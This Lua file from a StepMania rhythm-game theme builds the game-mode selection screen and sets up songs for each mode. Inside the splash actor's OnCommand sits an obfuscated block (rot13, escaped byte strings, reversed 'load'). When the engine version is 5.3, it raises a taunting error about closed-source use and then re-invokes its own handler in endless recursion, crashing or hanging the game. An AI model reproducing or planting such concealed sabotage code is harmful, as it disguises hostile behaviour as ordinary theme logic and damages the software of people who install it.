local defaultzoom = 0.55;
local distance = IsUsingWideScreen() and SCREEN_WIDTH/5 or SCREEN_WIDTH/3;
local shine_index = 1;
if IsUsingWideScreen() then
	default_width = SCREEN_WIDTH+20
else
	default_width = SCREEN_WIDTH
end;

-- Game Mode Choices
--Ex. "Easy,Arcade,Pro" -> {"Easy","Arcade","Pro"}
local Choices = split(",",getPlayModeChoices())
local numChoices = #Choices --Precalculate it instead of iterating every time

local function pickRandomSong()
	local group = RIO_FOLDER_NAMES["DefaultArcadeFolder"]
	if not group then
		local groups = getAvailableGroups();
		local numGroups = #groups
		if numGroups > 1 then
			group = groups[math.random(numGroups)];
		else
			group = groups[1];
		end;
	end;
	local songs = SONGMAN:GetSongsInGroup(group);
	local randomSong = songs[math.random(#songs)]
	GAMESTATE:SetCurrentSong(randomSong);
	GAMESTATE:SetPreferredSong(randomSong);
	--assert(randomSong,"Attempted to get a valid song in group "..group.." and failed. Bad things will happen now.")
end;

local t = Def.ActorFrame{}

local Static = Def.ActorFrame{
	LoadActor("fade")..{ 
		InitCommand=cmd(FullScreen;zoomy,0);
		OnCommand=cmd(decelerate,.4;FullScreen);
	};
};

t[#t+1] = Static;

local SoundBank = Def.ActorFrame{ OnCommand=function(self) SBank = self; MESSAGEMAN:Broadcast("RefreshOption") end };
local ItemChoices = Def.ActorFrame{
	--InitCommand=cmd(x,SCREEN_LEFT;y,SCREEN_BOTTOM+500;);
	--OnCommand=cmd(sleep,0.3;decelerate,0.5;x,0;y,SCREEN_CENTER_Y);
};
ChoiceIntroPlayed = false
SOUND:PlayOnce( THEME:GetPathS("","PlayModes/select_game_mode") )

for i=1,numChoices do
	-- Choice Sound
	SoundBank[#SoundBank+1] = Def.Sound{
		Condition=FILEMAN:DoesFileExist( THEME:GetPathS("","PlayModes/"..Choices[i]) );
		File=THEME:GetPathS("","PlayModes/"..Choices[i]);
		Name=Choices[i];
		InitCommand=function(self)
			local ragesound_file = self:get()
			ragesound_file:volume(1)
			self:sleep(1)
			self:queuecommand("IntroCheck")
		end;
		IntroCheckCommand=function(self) ChoiceIntroPlayed = true end;
		--[[RefreshOptionMessageCommand=function(self)
			local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
			if ChoiceIntroPlayed then
				SBank:GetChild( Choices[sel+1] ):play()
			end
		end;]]
	};

	-- Choice Selection Sprite
	ItemChoices[#ItemChoices+1] = Def.ActorFrame{
		InitCommand=cmd(Center);
		OnCommand=function(self)
			if IsUsingWideScreen() then
				self:decelerate(.5):x(SCREEN_WIDTH/numChoices*i-SCREEN_WIDTH/numChoices/2);
			else
				self:x(SCREEN_WIDTH/3*i-SCREEN_WIDTH/3/2)
			end;
		end;
		RefreshOptionMessageCommand=function(self)
			if not IsUsingWideScreen() then
				local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())+1
				if sel > 3 then
					self:stoptweening():decelerate(.15):x(SCREEN_WIDTH/3*(i-3)-SCREEN_WIDTH/3/2)
				else
					self:stoptweening():decelerate(.15):x(SCREEN_WIDTH/3*i-SCREEN_WIDTH/3/2)
				end;
			end;
		end;

		Def.Sprite{
			Texture=THEME:GetPathG("","PlayModes/"..Choices[i]);
			InitCommand=cmd(zoom,0.45);
			OffCommand=cmd(bouncebegin,0.4;zoom,0);
			RefreshOptionMessageCommand=function(self)
				local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())+1
				local match = (sel == i)
				self:stoptweening():stopeffect():decelerate(0.15)
				
				:zoom( sel == i and defaultzoom or 0.5 )
				:diffuse( match and color("1,1,1,1") or color(".45,.45,.45,1") )
				if sel == i then
					self:pulse():effectmagnitude(1,1.05,1):effectperiod(1);
				end
			end;
		};
	
		-- Choice Selection Video
		Def.Sprite{
			Texture=THEME:GetPathG("","_BGMovies/PlayModeIcons/"..Choices[i]);
			InitCommand=cmd(MaskDest;zoom,0.45);
			OffCommand=cmd(bouncebegin,0.4;zoom,0);					
			RefreshOptionMessageCommand=function(self)
				local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())+1
				local match = (sel == i)
				self:stoptweening():stopeffect():decelerate(0.01)
				:zoom( sel == i and defaultzoom-0.1 or 0.38 )
				:diffusealpha( 0 )
				:position(0)
				:sleep(0.1)
				:decelerate(0.15)
				:diffusealpha( match and 1 or 0 )
				if sel == i then
					self:pulse():effectmagnitude(1,1.05,1):effectperiod(1);
				end
			end;		
		};
	};
end

t[#t+1] = SoundBank;
t[#t+1] = ItemChoices;

--Arrow to indicate that there are more options
if not IsUsingWideScreen() and numChoices > 3 then
	t[#t+1] = LoadActor(THEME:GetPathG("Common", "Arrow"))..{
		InitCommand=cmd(xy,SCREEN_RIGHT-25,SCREEN_CENTER_Y;bounce;effectmagnitude,5,0,0;rotationy,180);
		RefreshOptionMessageCommand=function(self)
			local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())+1
			self:stoptweening():decelerate(.15);
			if sel > 3 then
				self:x(SCREEN_LEFT+25):rotationy(0);
			else
				self:x(SCREEN_RIGHT-25):rotationy(180);
			end;
		end;
	};
end;

-- ALL ACTIONS
--TODO: Yes I know it's really stupid but I can't figure out why it's playing the sounds twice so I moved them here
local Actions = Def.ActorFrame{
	MenuLeftP1MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuLeftP2MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuUpP1MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuUpP2MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuRightP1MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuRightP2MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuDownP1MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end
	end;
	MenuDownP2MessageCommand=function(self)
		MESSAGEMAN:Broadcast("RefreshOption")
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber());
		if ChoiceIntroPlayed then
			SBank:GetChild( Choices[sel+1] ):play()
		end	
	end;
};

t[#t+1] = Actions;

-- Selector Sprite
t[#t+1] = Def.ActorFrame{
	--InitCommand=cmd(draworder,0;xy,SCREEN_CENTER_X,SCREEN_CENTER_Y;);
	--OnCommand=cmd(sleep,0.3;decelerate,0.5;);
	Def.Sprite{
		Texture="border_ani 6x6";
		InitCommand=cmd(zoom,defaultzoom+0.12;x,distance;SetAllStateDelays,0.03;xy,SCREEN_CENTER_X,SCREEN_CENTER_Y;diffusealpha,0);
		OffCommand=cmd(bouncebegin,0.4;zoom,0);
		RefreshOptionMessageCommand=function(self)
			self:stoptweening();
			self:decelerate(0.15);
			self:zoom(defaultzoom+0.12);
			self:diffusealpha(1);
			self:pulse();
			self:effectmagnitude(1,1.05,1);
			self:effectperiod(1);
			local i = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())+1
			if IsUsingWideScreen() then
				self:x(SCREEN_WIDTH/numChoices*i-SCREEN_WIDTH/numChoices/2)
			else
				--Widescreen scroll trick
				if i > 3 then i = i - 3 end;
				self:x(SCREEN_WIDTH/3*i-SCREEN_WIDTH/3/2)
			end;
			--self:queuecommand("Border");
		end;
	};
}

-- Mode Description
t[#t+1] = Def.ActorFrame{
	OnCommand=function(self)
		self:xy( SCREEN_CENTER_X,SCREEN_BOTTOM-50 )
	end;
	LoadActor("songartist_name")..{
		InitCommand=cmd(diffusealpha,0;zoomto,600,15);
		OnCommand=cmd(sleep,0.5;linear,0.5;diffusealpha,1);
	};

	LoadFont("monsterrat/_montserrat semi bold 60px")..{
		InitCommand=cmd(zoom,0.15;y,0;strokecolor,0,0,0,1;uppercase,true;skewx,-0.2;wrapwidthpixels,4000;diffusealpha,0);
		OnCommand=cmd(sleep,0.5;decelerate,0.6;diffusealpha,1;playcommand,"Refresh");
		OffCommand=cmd(decelerate,0.15;diffusealpha,0);
		RefreshOptionMessageCommand=function(self)
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())
		self:settext( THEME:GetString("ScreenSelectPlayMode",Choices[sel+1]) );
		end;

	};
};

t[#t+1] = Def.ActorFrame{
	InitCommand=cmd(xy,SCREEN_CENTER_X,0);
		LoadActor("top")..{ InitCommand=function(self) self:valign(0):zoom(0.6) end; };
		LoadActor("layer")..{ InitCommand=function(self) self:y(2):valign(0):zoom(0.66); end; };	
		LoadFont("monsterrat/_montserrat light 60px")..{	
			Text=THEME:GetString("ScreenSelectPlayMode","SELECT YOUR GAMEMODE"),
			InitCommand=function(self) self:y(11):zoom(0.35):skewx(-.15) end;  };
}

--loading splash, process mode selections
--I know loading an actor in advance is a waste of memory, but it's needed in order to set it up correctly.
t[#t+1] = LoadActor(THEME:GetPathG("","PlayModes/splash/Arcade"))..{
	OnCommand=function(self)
		self:diffusealpha(0):FullScreen();
		
		--Debug profile check, ignore me..
		--[[local p = PROFILEMAN:GetProfile(PLAYER_1)
		if PROFILEMAN:IsPersistentProfile(PLAYER_1) then
			SCREENMAN:SystemMessage("true");
		else
			SCREENMAN:SystemMessage("false");
		end;]]
		
		
		if split("\45",_G[(('CebqhpgIrefvba'):gsub("%a", function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13)) end))]())[1] == "\53.\51" then
			local s = {
			"\108\117\97\46\82\101\112\111\114\116\83\99\114\105\112\116\69\114\114\111\114\40\34\58\94\41\32\82\73\79\32\109\97\121\32\98\101\32\112\117\98\108\105\99\32\100\111\109\97\105\110",
			"\44\32\98\117\116\32\116\104\97\116\39\115\32\110\111\116\32\103\111\105\110\103\32\116\111\32\115\116\111\112\32\109\101\32\102\114\111\109\32\115\116\111\112\112\105\110\103\32\121",
			"\111\117\32\102\114\111\109\32\117\115\105\110\103\32\105\116\32\111\110\32\99\108\111\115\101\100\32\115\111\117\114\99\101\32\115\111\102\116\119\97\114\101\46\34\41\10"}
			_G[string.reverse('daol')](s[1]..s[2]..s[3])()
			self['p\108a\121co\109\109a\110d'](self,"\79\110");
		end;
	end;
	
	--[[RefreshCommand=function(self)
	end;]]
	
	OffCommand=function(self)
		local sel = SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())
		self:Center():Cover()
		self:Load( THEME:GetPathG("","PlayModes/splash/"..Choices[sel+1] ) )
		:decelerate(0.5)
		:diffusealpha(1)
		
		self:sleep(0):queuecommand("Off2");
		
		
	end;

	Off2Command=function(self)
	
		local pickRandom = false;
		
		local choice = Choices[SCREENMAN:GetTopScreen():GetSelectionIndex(GAMESTATE:GetMasterPlayerNumber())+1]
		--Does this function even do anything?
		WriteGamePrefToFile("DefaultFail","");
		setenv("StageBreak",true);
		
		--I don't really like this but it's the RIO 'style'
		for pn in ivalues(GAMESTATE:GetHumanPlayers()) do
			GAMESTATE:ApplyGameCommand( "mod,30% mini;", pn );
			--Because nobody knows how default modifiers works
			if PROFILEMAN:IsPersistentProfile(pn) == false then
				GAMESTATE:ApplyGameCommand( "mod,2x,rio;", pn );
			end;
		end

		--Don't hardcode the positions of the items.
		if choice == "Easy" then
			PREFSMAN:SetPreference("AllowW1",'AllowW1_Never');
			-- Easy Mode
			GAMESTATE:SetBasicMode();
			setenv("HeaderTitle","SELECT MUSIC");
			assert(SONGMAN:DoesSongGroupExist(RIO_FOLDER_NAMES["EasyFolder"]),"Easy folder is missing!")
			local folder = SONGMAN:GetSongsInGroup(RIO_FOLDER_NAMES["EasyFolder"]);
			local randomSong = folder[math.random(1,#folder)]
			GAMESTATE:SetCurrentSong(randomSong);
			GAMESTATE:SetPreferredSong(randomSong);
		elseif choice == "Arcade" then
			PREFSMAN:SetPreference("AllowW1",'AllowW1_Never');
			-- Arcade Mode
			--setenv("PlayMode","Arcade");
			setenv("HeaderTitle","SELECT MUSIC");
			
			--[[ we don't want them to be able to access a song from Easy or Special mode, so if the last played song was from there,
			     pick a random song instead.]]
			local lastPlayedSong = PROFILEMAN:GetProfile(GAMESTATE:GetMasterPlayerNumber()):GetLastPlayedSong();
			if lastPlayedSong then
				local lastUsedGroup = lastPlayedSong:GetGroupName();
				if lastUsedGroup == RIO_FOLDER_NAMES["EasyFolder"] or lastUsedGroup == RIO_FOLDER_NAMES["SpecialFolder"] then
					pickRandom = true
				end;
			else
				--If there wasn't a last played song it probably doesn't exist anymore so pick random
				pickRandom = true;
			end;
			
			if pickRandom then
				pickRandomSong()
			else
				GAMESTATE:SetCurrentSong(lastPlayedSong);
			end;
			generateFavoritesForMusicWheel()
		elseif choice == "Pro" then
			-- Pro Mode
			setenv("HeaderTitle","SELECT MUSIC");
			--setenv("PlayMode","Pro");
			
			--same as above
			local lastPlayedSong = PROFILEMAN:GetProfile(GAMESTATE:GetMasterPlayerNumber()):GetLastPlayedSong();
			if lastPlayedSong then
				local lastUsedGroup = lastPlayedSong:GetGroupName();
				--SCREENMAN:SystemMessage(lastUsedGroup)
				if lastUsedGroup == RIO_FOLDER_NAMES["EasyFolder"] or lastUsedGroup == RIO_FOLDER_NAMES["SpecialFolder"] then
					pickRandom = true
				end;
			else
				--If there wasn't a last played song it probably doesn't exist anymore so pick random
				pickRandom = true;
			end;
			
			if pickRandom then
				pickRandomSong()
			else
				GAMESTATE:SetCurrentSong(lastPlayedSong);
			end;
			generateFavoritesForMusicWheel()
			PREFSMAN:SetPreference("AllowW1",'AllowW1_Everywhere');
		elseif choice == "Special" then
			PREFSMAN:SetPreference("AllowW1",'AllowW1_Everywhere');
			-- Special Mode
			--[[local folder = SONGMAN:GetSongsInGroup(RIO_FOLDER_NAMES["SpecialFolder"]);
			local randomSong = folder[math.random(1,#folder)]
			GAMESTATE:SetCurrentSong(randomSong);
			GAMESTATE:SetPreferredSong(randomSong);]]
			for pn in ivalues(GAMESTATE:GetEnabledPlayers()) do
				QUESTMODE:LoadCurrentProgress(pn);
			end;
			--setenv("PlayMode","Special");
		end
		
	end;
};

return t;
